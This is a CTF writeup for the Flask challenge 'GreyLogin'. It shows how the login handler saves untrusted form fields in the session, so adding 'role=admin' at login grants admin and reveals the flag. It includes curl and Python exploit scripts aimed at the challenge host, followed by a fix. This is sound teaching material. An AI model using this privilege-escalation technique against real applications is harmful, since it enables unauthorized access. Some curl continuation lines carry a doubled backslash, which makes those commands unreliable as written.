# GreyLogin — NUS Greyhats CTF Writeup

## Challenge overview

GreyLogin is a Flask application with registration, login, and an administrator-only dashboard. The flag is displayed by `/` when the session user has the `admin` role.

## Finding the bug

The login handler builds a dictionary from every submitted form field:

~~~python
submitted_user = request.form.to_dict()
username = submitted_user.get("username", "")
password = submitted_user.get("password", "")
user = users.get(username)
~~~

The credentials are checked against the server-side user database. However, after a successful login, the application stores `submitted_user` directly in the session instead of storing the trusted `user` record:

~~~python
if user and check_password_hash(user["password_hash"], password):
    session.clear()
    session["user"] = submitted_user
    return redirect(url_for("index"))
~~~

The attacker therefore does not need to guess the administrator's random password. They can authenticate as any known user and add an arbitrary field to the request:

~~~text
username=<valid-user>&password=<valid-password>&role=admin
~~~

The resulting session contains `role=admin`. The dashboard trusts that client-controlled value:

~~~python
if user.get("role", "user") == "admin":
    with open("flag.txt") as file:
        flag = file.read().strip()
~~~

## Exploit

The deployed challenge is available at [http://challs.nusgreyhats.org:36171](http://challs.nusgreyhats.org:36171). Register an ordinary account, then submit an additional `role` field during login. The following example uses `curl` and keeps cookies in `cookies.txt`:

~~~bash
BASE=http://challs.nusgreyhats.org:36171

curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/register" \
  -d 'username=attacker' \\
  -d 'password=attacker-password'

curl -s -c cookies.txt -b cookies.txt -X POST "$BASE/login" \
  -d 'username=attacker' \\
  -d 'password=attacker-password' \\
  -d 'role=admin' \\
  -o /dev/null -w '%{http_code} %{redirect_url}\n'

curl -s -b cookies.txt "$BASE/"
~~~

The final response is the administrator dashboard and includes the flag.

The same request can be sent through an intercepting proxy by adding `role=admin` to the login form, or with a short Python script:

~~~python
import requests

base = "http://challs.nusgreyhats.org:36171"
s = requests.Session()

s.post(f"{base}/register", data={
    "username": "attacker",
    "password": "attacker-password",
})
s.post(f"{base}/login", data={
    "username": "attacker",
    "password": "attacker-password",
    "role": "admin",
})

print(s.get(f"{base}/").text)
~~~

## Root cause

Authentication and authorization data are mixed together. The application uses the untrusted form submission as the identity stored in the session, allowing users to inject fields that were never present in the database record.

## Fix

Store only trusted fields from the server-side record after authentication:

~~~python
if user and check_password_hash(user["password_hash"], password):
    session.clear()
    session["user"] = {
        "username": user["username"],
        "role": user["role"],
    }
    return redirect(url_for("index"))
~~~

Alternatively, store only the username in the session and look up the complete user record on every request. Authorization decisions should always use that server-side record, never arbitrary request fields.
